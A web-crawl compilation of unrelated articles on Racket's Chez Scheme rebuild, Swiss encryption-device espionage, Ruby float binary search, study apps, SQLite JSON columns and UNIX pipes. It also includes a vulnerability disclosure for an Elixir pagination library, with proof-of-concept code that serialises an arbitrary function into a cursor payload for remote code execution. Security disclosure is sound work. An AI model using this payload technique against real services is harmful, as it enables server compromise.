rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="intro">Intro</h2>

<p>In August of this year I found a remote code execution vulnerability in the Elixir-based <a href="">Paginator</a> open-source project from <a href="https://duffel.com/">Duffel</a> (a UK-based startup in the flight searching space).
The vulnerability has the CVE number <a href="https://github.com/duffelhq/paginator/security/advisories/GHSA-w98m-2xqg-9cvj">CVE-2020-15150</a> assigned. Since Duffel seemed to use Paginator for its own REST API it seems likely
that an attacker exploiting this vulnerability would have been able to execute code on Duffel’s (cloud) assets.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>This code execution vulnerability existed due to the use of Erlang’s <code>binary_to_term</code> in combination with untrusted user data.
This function is much more dangerous when used in Elixir.</p>

<p>The vulnerability could have been triggered via Paginator’s user provided before/after cursors. As seen in <a href="https://duffel.com/docs/api/overview/pagination">Duffel’s Pagination API</a>:</p>

<p><img src="https://www.alphabot.com/images/blog/elixir-paginator/duffel_paginator_api.png" alt="Duffel's Pagination REST API"></p>

<p>The string <code>g2wAAAACbQAAABBBZXJvbWlzdC1LaGFya2l2bQAAAB=</code> is a Base64 encoded binary serialized Erlang term (ETF).
Such an Erlang term can contain anything from simple string values to full-blown functions containing almost any code you’d like.
However, in normal Erlang such a function provided in the payload would not be executed automatically (at least if nobody explicitly calls that function).
In Elixir there’s a much higher chance that such a function is executed later down the road, thanks to the Enumerable protocol of Elixir.</p>

<h2 id="exploits">Exploits</h2>

<p>To demonstrate this vulnerability I created two exploits.
The first one starts <code>xcalc</code>:</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_start_xcalc</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>System</span><span>.</span><span>cmd</span><span>(</span><span>"</span><span>xcalc"</span><span>,</span> <span>[]);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The second one prints the stacktrace (so we see where our anonymous function has been triggered):</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_print_stacktrace</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>IO</span><span>.</span><span>inspect</span><span>(</span><span>Process</span><span>.</span><span>info</span><span>(</span><span>self</span><span>(),</span> <span>:current_stacktrace</span><span>),</span> <span>label:</span> <span>"</span><span>RCE STACKTRACE"</span><span>);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>

<p>The functions above create a Base64 encoded exploit payload (same as the cursors used by Paginator).
However, they do not include information about the whereabouts of the cursor, but instead contain an anonymous function that we want the server to execute.
(An attacker would execute this functions above on his side, only providing the Base64 encoded payload to an API using Duffel’s Paginator.)</p>

<p>The stacktrace output of the second exploit payload looked like this (when executed from a unit test):</p>

our anonymous function is implicitly called by Elixir (thanks to the Enumerable protocol).</p>

<h2 id="additional-information">Additional information</h2>

<p>This is not the first time a vulnerability caused by the use of <code>binary_to_term</code> in combination with untrusted data has been found.
<a href="https://twitter.com/griffinbyatt">Griffin Byatt</a> probably discovered the first publicly known:
<a href="https://blog.voltone.net/post/10">Code execution through the session cookie</a> in the popular
and widely used Elixir <a href="https://hexdocs.pm/plug/readme.html">Plug</a>.</p>

<p>The Security Working Group of the Erlang Ecosystem Foundation has some recommendations regarding <a href="https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/serialisation">Serialisation and deserialisation</a>
including recommendations for mitigations.</p>

<div>
      
      <p>
        The official <a href="https://erlang.org/doc/man/erlang.html#binary_to_term-1">Erlang documentation</a> does "warn" about <code>binary_to_term/1</code>, and recommends <code>binary_to_term/2</code>.
        However, using <code>binary_to_term/2</code> is not a protection against the code execution shown here (especially not in Elixir). In fact the paginator library used <code>binary_to_term/2</code> with the <code>safe</code> option.
        Using <code>binary_to_term/2</code> with the <code>safe</code> option only protects against certain Denial of Service attacks.
      </p>
</div>

<h2 id="thanks">Thanks</h2>

<p>Thanks are in order for Duffel (the maintainers of this project):</p>
<ul>
  <li>Firstly: Duffel fixed the vulnerability in <b>less than one day</b> and acted very professionally throughout the process.</li>
  <li>Secondly: Despite not having a bug bounty program, Duffel payed a bounty of 1000 GBP, which I donated in parts to a
fund providing help for victims of the explosion in the port of Lebanon.</li>
</ul>

</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>
<span>This content was published on November 26, 2020 - 11:34</span>
<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77
4.8915590244884904e+38
2.7093655358260904e+19

42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

This is understandable but surely there must be a reason so many people have invested in smart trackers other than our obsession with wearable tech?</span></p><p id="viewer-rnti"><span>
The point is that these devices will work, for <strong>some people. </strong>That is to say that too many people go and buy these devices hoping they'll motivate them to move more, but this just isn't the case; consumers misperceive what are in fact data trackers as motivational tools.</span></p><blockquote id="viewer-1dp63"><span>
“Fitness trackers are equivalent to a bathroom scale,” says Eric Finkelstein, lead author of the Lancet study. “They’re a measurement tool, not an intervention tool. They tell you something, but don’t give you a strategy for how to change it.”</span></blockquote><h3 id="viewer-4sqnd"><span><strong>Should you still go out and buy one?</strong></span></h3><p id="viewer-fnpda"><span>As I said before, the usefulness of these devices varies from person to person, if you think that receiving a bunch of data about how much you’re moving on a regular basis will motivate to stay active then sure!

    <p>As many of us have experienced during school years, late-night learning is not the most effective technique. The information might have stuck around for a short period, but just after the day of the exam, it flew away with us unable to recall it. If you would like to remember more during and after your studies, forget the last-minute learning. Using spaced repetition, a method to rehearse educational material, you will not simply earn better grades, but studying would be an overall easier process and memorized information will be available to recall later in your life.</p>

<p>The spaced repetition system is a learning technique in which the material previously learned is recalled by the learner from time to time at ever-increasing intervals. This method is based on the intermittent repetition effect on how we tend to forget information. The primary goal of the technique is to recall the material learned as infrequently as possible, just before we forget it. By approaching repetitions in this scientific way, time spent learning can be used much more efficiently.</p>
<h2>The neurological background of memorizing</h2>
<p>Learning always begins with perception, the form of how we collect information. This data travels through the nerve pathways to the place where the perception is processed, our brain. Some perceptions cause our bodies to react, which usually does not happen consciously.</p>
<p>Scientists once thought that the brain stores memories in a similar way to computers. It was later proved that the artificial approach is completely different: information is broken down into elements (bits) on the computer and is stored that way. The machines can store up to a certain amount of information on a storage device called a hard disk. If our brain would work similarly, despite having hundreds of billions of cells, our internal storage device would have filled up in a matter of hours.</p>
<p>Our brains work in a rather different way: since we always store information in context it is more about capturing the contents of things. That’s why when we recall a memory, related reminiscences come to mind, like smells or the color of the paper, or what we ate for dinner during learning.</p>
<h2>What makes spaced repetition so effective?</h2>
<p>Spaced repetition technique is one of the most effective learning techniques, which you probably use even if you do not know about it. Using this method consciously makes it far superior to standard learning.</p>
<p>There are three key values it provides:</p>
<div>
<p>Delays forgetting learned information by prolonging the forget-curve.</p>
<p>Active recall helps to keep memorized information fresh (as the context layers build-up, it gets easier to remember what you have learned).</p>
<p>Spaced repetition supports long term memory, so you won’t forget the learned information even after the exam.</p>
</div>
<h2>How to get started with the spaced repetition system?</h2>
<p>To put the above in practice, try to remember a movie you’ve seen more than one time. After you’ve watched it first, you understood it well, but a few weeks later you only remembered the title and main story points. You watched it with a friend two months later, and while watching, you have realized that you can recall the story and started to watch out for certain details in the background, or the listening closer to the music. When you watched it for the third time, you probably remembered all the names, a few exact quotes, and the story details too.</p>
<p>Of course, the typical study materials are far from a movie’s excitement, however, learning it works the same. Review your documents and memorize them for the first time. After you have finished, try recalling them in a suitable way: you can write them down or simply rehearse the answers out loud. (Trying to recall it through your inner voice is not the best idea as we all tend to cheat ourselves.)</p>
<p>If you recalled it correctly, put the documents down and start another activity. After an hour try to rehearse it again, maybe using a different method. Then again in a few hours, and on the next day morning. Keep lengthening these intervals until you are ready to face the exam.</p>
<h2>Applications and websites that support you along the journey</h2>
<p>Luckily, today we have multiple choices on how to organize our studies. Different websites, along with applications, will help to study faster and also memorize for the long-term. Let’s see 5 software programs and applications utilizing the spaced repetition system!</p>
<h3>1. <a href="https://quizlet.com/" target="_blank" rel="noopener noreferrer">Quizlet</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Quizlet-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Quizlet-logo.png" alt="Quizlet logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> This is an application that you can use either through your browser or on any mobile device. With one account you can have all your data synchronized, so you can continue your studies away from the computer when it is time to repeat!</p>
<p>The basic idea of Quizlet is that you can search for subjects that already have their case sets and use those, or you can create your own “memorizing cards”. Just enter the term and the definition, and after you are ready, you can start the learning process. Quizlet is also utilized for high-level education and corporate usage, ranging from healthcare studies to Starbucks training programs.</p>
<p>The app is available for students and teachers as well. If you get the vibe of this tool and you want to support it, for a low amount of monthly payment you can also purchase Quizlet Go or Plus for wider and advanced toolkits to create enhanced study sets.</p>
<p><strong>How it fits with SRLT:</strong> After creating or choosing your flashcard set, you can start to memorize the information. When you feel ready, you can choose how to check your knowledge. First is the “Learning” phase: Quizlet will show you the term and you will have to answer it from multiple choices or you will have to type it from memory - and the software will immediately review it. Getting it correctly will set the term as “Familiar”, and after multiple times it will be changed to “Mastered”. Furthermore, this spaced repetition app will give you constant feedback based on your answers, where you are in the learning process, and what you should focus on.</p>
<h3>2. <a href="https://www.edapp.com/" target="_blank" rel="noopener noreferrer">EdApp</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/EdApp-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/EdApp-logo.png" alt="EdApp logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> Signing up for EdApp will give you a choice if you want to educate others or yourself. The registration is fast, and you can immediately create your topic or search in the content library based on your interest.</p>
<p>The contents will be summarized using texts, gifs, and short videos because visualization had a great positive effect on memorizing capabilities. The presentations also have interactive parts, triggering the mind with the element of surprise, stabilizing the learned information. While you are stepping further, EdApp will give you milestones to know where you are in the process.</p>
<p><strong>How it fits with SRLT:</strong> With its sophisticated approach and triggering effects, this spaced repetition software helps to improve memorizing information. On its finalizing page it summarizes the studied content, and based on your answers it gives feedback.</p>
<h3>3. <a href="https://apps.ankiweb.net/" target="_blank" rel="noopener noreferrer">Anki</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Anki-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Anki-logo.png" alt="Anki logo"></picture> <strong>Platforms:</strong> Windows, Mac, Linux, iOS, Android, and any device with a web browser</p>
<p><strong>The basic idea:</strong> Anki is a simple, ad-free software that helps you to create flashcards. After downloading it to your computer or on your mobile phone, the first step is to generate decks, which will include flashcards. All cards have a front- and a backside that you can fill up with information. Also, you can insert pictures and other notes from your classes, so you can memorize those as well. You can also grade the difficulty of the lesson. Anki is mostly used by college students (especially in healthcare). It runs offline, and its ad-free, transparent user interface won’t cause any disturbance during studying.</p>
<p><strong>How it fits with SRLT:</strong> Based on how difficult you have found the lecture, the program will offer you three choices to choose from: to see the lesson again in one minute or to repeat it in ten minutes or four days.</p>
<h3>4. <a href="https://www.brainscape.com/" target="_blank" rel="noopener noreferrer">Brainscape</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Brainscape-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Brainscape-logo.png" alt="Brainscape logo"></picture> <strong>Platforms:</strong> web, Android, iOS</p>
<p><strong>The basic idea:</strong> Brainscape is a specialized spaced repetition system where the algorithm focuses on the areas which need improvements, based on your answers and learning patterns. This is a lively web surface because their team is openly active on other social media websites and showing their results and feedback from users and companies, furthermore, a blog, full of content, is available as well.</p>
<p><strong>How it fits with SRLT:</strong> Brainscape will effectively monitor and check your answers and will support you - if you are honest how well you have known the flash cards’ answers, based on a scale from 1 to 5. It will also measure time during your study phases and help you to memorize information faster.</p>
<h3>5. <a href="http://smartcardsplus.com/" target="_blank" rel="noopener noreferrer">SmartCards+</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/SmartCards-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/SmartCards-logo.png" alt="SmartCards+ logo"></picture> <strong>Platform:</strong> iOS</p>
<p><strong>The basic idea:</strong> Smartcards will support your studies with a learning curve, measure the optimal time, and suggest when to repeat your studies. This spaced repetition app is only available for iOS users.</p>
<p><strong>How it fits with SRLT:</strong> Its classical surface will help you not simply with drag and drop text flashcards, but you can also insert video and audio files to support the memorization process. Furthermore, typing an answer is also an option during the learning phase, and the program will color results to show if you were correct or not.</p>
<h2>Conclusion</h2>
<p>Learning accompanies us throughout our entire life, while as we age studying gets harder. Spaced repetition is a good-to-know tactic (or even life-hack) that you might have used before without consciously knowing it. Utilizing the method through one of the above spaced repetition software apps will help you to memorize learning materials more effectively and in less time. The method comes handy in all ages, regardless if you go to school, prepare for college exams, or do corporate training to develop your career.</p>

<p>SQLite has had JSON support for a while.</p>

<p>However recently it added a killer feature: <a href="https://www.sqlite.org/gencol.html">generated
columns</a>. (This was added in 3.31.0,
released 2020-01-22.)</p>

<p>This makes it possible to insert JSON straight into SQLite and then have it
extract data and index them, i.e. you can treat SQLite as a document database.
This has been possible with PostgreSQL and obviously is what something like
Elastic provides but having it available in an embedded database is very nice
for lightweight stuff.</p>

<p>Let's get started:</p>

<pre><code>$ sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Connected to a transient in-memory database.
sqlite&gt; CREATE TABLE t (
   body TEXT,
   d INT GENERATED ALWAYS AS (json_extract(body, '$.d')) VIRTUAL);
sqlite&gt; insert into t values(json('{"d":"42"}'));
sqlite&gt; select * from t WHERE d = 42;
{"d":"42"}|42
</code></pre>

<p>It's that simple, the <code>d</code> column is extracted from the provided JSON.</p>

<p>(Aside: The hard bit may be getting a new enough SQLite, at the time of writing
Homebrew on macOS has it, else you likely need to use an unstable source like
nixpkgs-unstable.)</p>

<p>There's some nice properties of this. Normally it's encouraged to minifiy and
validate JSON when inserting (via the <code>json()</code> function) as because SQLite
doesn't have a JSON type it will allow anything. However nothing enforces that,
you could add a constraint but will probably forget... Having <code>GENERATED ALWAYS</code>
using <code>json_extract</code> means invalid JSON will get a <code>Error: malformed JSON</code> at
INSERT time.</p>

<p>This can be taken further:</p>

<pre><code>sqlite&gt; CREATE TABLE x (
  body TEXT,
  id TEXT GENERATED ALWAYS AS (json_extract(body, '$.id')) VIRTUAL NOT NULL);
sqlite&gt; insert into x values('');
Error: malformed JSON
sqlite&gt; insert into x values('{}');
Error: NOT NULL constraint failed: x.id
</code></pre>

<p>We can enforce items are present in the inserted JSON, here by adding <code>NOT
NULL</code>, but we could also use constraints and other SQLite features!</p>

<p>You'll notice I've used <code>VIRTUAL</code> with the generated column in these examples.
There's also the option of using <code>STORED</code> to essentially cache the values,
although a downside is you can't add those columns via <code>ALTER TABLE</code>.</p>

<p>However you can always create an index on a column, even if it's defined a
virtual one:</p>

<pre><code>CREATE INDEX xid on x(id);</code></pre>

<p>Then check that's going to work as expected:
</p><pre><code>EXPLAIN QUERY PLAN SELECT * FROM x WHERE id='foo';
QUERY PLAN
`--SEARCH TABLE x USING INDEX xid (id=?)
</code></pre>

<p>Combined with ALTER TABLE we can add a new column and index it:</p>

<pre><code>ALTER TABLE x ADD COLUMN text TEXT
    GENERATED ALWAYS AS (json_extract(body, '$.text')) VIRTUAL;
INSERT INTO x VALUES(json('{"id":43, "text":"test"}'));
CREATE INDEX xtext ON x(text);
</code></pre>

<p>
The benefit here is you can start off with a table which could be as simple as
just a single JSON column, and add columns and indexes as you find useful data
in that JSON. For example this can work really well for webhooks, insert all the
data you are sent straight into a table, then pull out the useful stuff later.
Have fun.

<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

